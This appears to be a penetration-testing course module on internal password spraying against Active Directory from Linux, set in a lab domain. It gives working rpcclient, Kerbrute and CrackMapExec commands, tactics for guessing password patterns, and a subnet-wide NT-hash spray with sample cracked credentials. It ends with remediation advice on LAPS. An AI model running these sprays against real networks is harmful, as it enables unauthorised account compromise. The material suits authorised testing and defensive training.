# Internal Password Spraying from Linux

With a valid user list built, you can execute the spray using several tools from a Linux host. Each tool below has different trade-offs in terms of stealth, speed, and output clarity.

***

## Using rpcclient

[rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) works well for spraying but requires some output filtering. A successful login does not produce an obvious success message. Instead, it returns `Authority Name` in the response, which you grep for to isolate valid hits. Invalid attempts produce no matching output and are silently dropped.

The following Bash one-liner (adapted from [this Black Hills InfoSec post](https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/)) iterates through a user list and attempts a single password against each account:

```bash
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

Example output when hits are found:

```
Account Name: tjohnson, Authority Name: INLANEFREIGHT
Account Name: sgage, Authority Name: INLANEFREIGHT
```

***

## Using Kerbrute

[Kerbrute](https://github.com/ropnop/kerbrute) can perform password spraying in addition to user enumeration. It uses Kerberos Pre-Authentication, making it faster than SMB-based spraying. Failed spray attempts with Kerbrute do count toward account lockout, so the same caution applies as with any other method.

```bash
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
```

Example output:

```
[+] VALID LOGIN: sgage@inlanefreight.local:Welcome1
Done! Tested 57 logins (1 successes) in 0.172 seconds
```

***

## Using CrackMapExec

[CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) accepts a text file of usernames and a single password for spraying. Pipe the output through `grep +` to filter out failed attempts and surface only successful logins:

```bash
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```

Example output:

```
SMB  172.16.5.5  445  ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123
```

Once you have a hit, validate the credentials directly against the Domain Controller before proceeding:

```bash
sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
```

Example output:

```
SMB  172.16.5.5  445  ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123
```

***

## Local Administrator Password Reuse

Password spraying is not limited to domain accounts. If you recover the NTLM hash or cleartext password for a local administrator account, you can attempt it across multiple hosts on the network. Local admin password reuse is common because many organisations deploy systems from the same gold image and never change the default local admin password across machines.

High-value targets worth prioritising:

- SQL servers
- Microsoft Exchange servers
- Any host likely to have a privileged user's credentials cached in memory

### Password Pattern Guessing

If you find a local admin password such as `$desktop%@admin123` on a workstation, try `$server%@admin123` on servers. If you find a non-standard local account like `bsmith`, check whether the same password works for a domain account of the same name. If you crack the password for a domain user `ajones`, try it against an admin variant like `ajones_adm`. The same logic applies across domain trusts, where credentials from domain A may be reused in domain B.

### Spraying an NT Hash Across a Subnet

When you only have the NT hash from a local SAM database, you can spray it across an entire subnet using [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec). The `--local-auth` flag restricts the tool to one login attempt per machine, which prevents domain account lockouts. Always use this flag when spraying local credentials. Without it, the tool defaults to domain authentication and can quickly lock out the domain's built-in administrator account.

```bash
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

Example output:

```
SMB  172.16.5.50   445  ACADEMY-EA-MX01  [+] ACADEMY-EA-MX01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
SMB  172.16.5.25   445  ACADEMY-EA-MS01  [+] ACADEMY-EA-MS01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
SMB  172.16.5.125  445  ACADEMY-EA-WEB0  [+] ACADEMY-EA-WEB0\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
```

The example above shows the hash was valid on three hosts in the `/23` subnet. Each of those machines can now be enumerated further to identify paths for expanding access.

***

## Stealth and Remediation Notes

This technique is noisy and not suitable for assessments that require evasion. Even when it is not the primary path to domain compromise, local admin password reuse should always be tested and reported as a finding. The free Microsoft tool [Local Administrator Password Solution (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899) directly addresses this issue by having Active Directory manage and rotate unique local administrator passwords on a set interval for each host.
